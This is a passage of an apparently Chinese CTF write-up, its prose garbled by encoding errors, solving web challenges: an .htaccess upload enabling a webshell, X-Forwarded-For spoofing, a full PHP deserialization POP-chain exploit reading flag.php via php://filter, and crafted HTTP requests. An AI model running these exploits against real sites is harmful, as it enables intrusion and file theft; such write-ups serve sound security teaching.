ğŸå‘¢</h2><p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤<code>.htaccess</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>è¯¥è¯­å¥ä½œç”¨æ˜¯è®©Apacheå°†å…¶ä»–ç±»å‹æ–‡ä»¶å‡ä»¥phpæ ¼å¼è§£æ</p><p>è¿™æ ·çš„è¯æˆ‘ä»¬ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘è¿æ¥å³å¯å¾—åˆ°flag</p><h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>è®¿é—®flag.phpï¼Œç„¶ååŠ ä¸Š<code>X-Forwarded-For:127.0.0.1</code>å°±å¯ä»¥è·å¾—flag</p><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>é¢˜ç›®æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆå›æº¯æ‰¾ï¼Œæ€ä¹ˆæ ·æ‰èƒ½å¾—åˆ°flagå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å…ˆçœ‹<code>Modifier</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰<code>append</code>æ–¹æ³•ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ‰€ä»¥æ€ä¹ˆæ‰èƒ½è°ƒç”¨è¿™ä¸ªæ–¹æ³•å‘¢ï¼Ÿè¿™é‡Œæœ‰<code>__invoke</code>æ–¹æ³•ï¼Œæˆ‘ä»¬è¦èƒ½æŠŠè¯¥ç±»å½“ä½œå‡½æ•°è°ƒç”¨å³å¯è§¦å‘</p><p>è·Ÿè¿›ï¼Œæ‰¾åˆ°Testç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åªè¦æŠŠ<code>$this-&gt;p=new Modifier</code>å³å¯ï¼Œé‚£ä¹ˆæ€ä¹ˆè§¦å‘<code>__get</code>æ–¹æ³•å‘¢ï¼Ÿ</p><p>å½“ä¸€ä¸ªå¯¹è±¡è°ƒç”¨æ— æƒé™è®¿é—®åˆ°çš„å±æ€§æˆ–è€…ä¸å­˜åœ¨çš„å±æ€§çš„æ—¶å€™å°±ä¼šè§¦å‘<code>__get</code>æ–¹æ³•</p><p>æ¥ç€è·Ÿè¿›Showç±»ä¸­çš„<code>__toString</code>æ–¹æ³•ï¼Œæˆ‘ä»¬åªè¦<code>$this-&gt;str=new Test</code>å³å¯è§¦å‘<code>__get</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ€ä¹ˆè§¦å‘<code>__toString</code>æ–¹æ³•å‘¢ï¼Ÿ</p><p>å½“ä¸€ä¸ªç±»è¢«å½“ä½œå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘è¯¥æ–¹æ³•</p><p>åœ¨Showç±»ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦è®©<code>$this-&gt;source=new Show</code>ï¼Œè¿™æ ·å³å¯è§¦å‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸‹é¢ä»£ç ï¼Œç„¶åä¼ å€¼å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">'php://filter/convert.base64-encode/resource=flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Test();</span><br><span class="line">$b-&gt;p = $a;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> Show();</span><br><span class="line">$c-&gt;str = $b;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> Show();</span><br><span class="line">$d-&gt;source = $c;</span><br><span class="line">$e = serialize($d);</span><br><span class="line">print_r(urlencode($e));</span><br></pre></td></tr></table></figure><h2 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure><p>å‘åŒ…</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?b+u+p+t=23333%0a</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 932aa4a2-952c-4cfc-acf6-7b108c542156.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯</p><p>jsfuckå¼¹çª—</p><p>post me Meraåï¼Œå¾—åˆ°<code>secrettw.php</code>æºç </p><p><code>secrettw.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™ä¸ªunchangeå‡½æ•°ï¼Œå› ä¸ºè¯»å–æ•°æ®çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨changeå‡½æ•°ï¼Œè¿™æ ·æˆ‘ä»¬ä¸èƒ½æ­£å¸¸è¯»å–æ•°æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘åŒ…å³å¯</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 932aa4a2-952c-4cfc-acf6-7b108c542156.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 20</span><br><span class="line"><span class="attribute">Referer</span>: localhost</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Client-Ip</span>: 127.0.0.1</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>ç½‘ç«™å­˜åœ¨<code>www.zip</code>å¤‡ä»½æ–‡ä»¶</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span 